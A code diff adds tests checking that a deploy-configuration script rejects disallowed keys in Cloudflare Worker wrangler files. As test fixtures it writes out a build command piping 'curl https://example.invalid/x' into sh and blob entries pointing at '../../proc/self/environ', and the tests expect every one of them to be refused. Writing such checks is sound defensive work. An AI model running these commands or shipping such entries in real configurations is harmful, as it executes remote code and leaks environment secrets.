@@ -192,6 +192,78 @@ describe('R137 relay-config.sh refuses link-store Worker name drift', () => {
   });
 });
 
+describe('E11 relay-config.sh holds the repository configurations to the hand-off allow-list', () => {
+  const storeConfig = 'packages/plugins/catalogs/worker/wrangler.link-store.hosted.json';
+  const hostedConfig = 'packages/plugins/connections/worker/wrangler.hosted.json';
+  const byoConfig = 'packages/plugins/connections/worker/wrangler.jsonc';
+
+  function withTree(mutate: (root: string) => void): { code: number; out: string } {
+    const root = fixtureTree();
+    try {
+      mutate(root);
+      return runScript(root);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  }
+  const addKey = (root: string, file: string, key: string, value: unknown): void => {
+    const path = join(root, file);
+    writeFileSync(path, JSON.stringify({ ...(JSON.parse(readFileSync(path, 'utf8')) as object), [key]: value }));
+  };
+
+  it('E11 the unmodified tree passes', () => {
+    expect(withTree(() => {}).code).toBe(0);
+  });
+
+  for (const file of [hostedConfig, storeConfig]) {
+    for (const [key, value] of [
+      ['build', { command: 'curl https://example.invalid/x | sh' }],
+      ['data_blobs', { SECRET: '../../proc/self/environ' }],
+      ['wasm_modules', { W: '../../proc/self/environ' }],
+      ['text_blobs', { T: '../../proc/self/environ' }],
+      ['rules', []],
+    ] as const) {
+      it(`E11 a \`${key}\` key in ${file.split('/').pop()} is refused`, () => {
+        const { code, out } = withTree(root => addKey(root, file, key, value));
+        expect(code).not.toBe(0);
+        expect(out).toContain('carries a key outside');
+      });
+    }
+  }
+
+  it('E11 a build or blob key in a self-hosted configuration is refused too', () => {
+    const { code, out } = withTree(root => {
+      const path = join(root, byoConfig);
+      writeFileSync(path, readFileSync(path, 'utf8').replace(/^\{/u, '{\n  "build": { "command": "true" },'));
+    });
+    expect(code).not.toBe(0);
+    expect(out).toContain('must carry no build, data_blobs, wasm_modules or text_blobs key');
+  });
+
+  it('E11 a workflow allow-list that admits a build or blob key is refused', () => {
+    const { code, out } = withTree(root => {
+      const path = join(root, '.github/workflows/relay-hosted.yaml');
+      writeFileSync(path, readFileSync(path, 'utf8').replace('"workers_dev"]', '"workers_dev","data_blobs"]'));
+    });
+    expect(code).not.toBe(0);
+    expect(out).toContain('HANDOFF_CONFIG_KEYS must not allow');
+  });
+
+  it('E11 a workflow that stops pinning the Worker name its configuration carries is refused', () => {
+    for (const workflow of ['relay-hosted.yaml', 'link-store-hosted.yaml']) {
+      const { code, out } = withTree(root => {
+        const path = join(root, '.github/workflows', workflow);
+        writeFileSync(
+          path,
+          readFileSync(path, 'utf8').replace(/--arg name ferretry-hosted-[a-z-]+ /u, '--arg name another-worker '),
+        );
+      });
+      expect(code).not.toBe(0);
+      expect(out).toContain('must pin the handed-over configuration');
+    }
+  });
+});
+
 describe('R227 the relay deploy does not touch the link store', () => {
   const workflow = (): string => workflowText();
   const parsed = (): { on: { push: { paths: string[] } }; jobs: Record<string, unknown> } =>
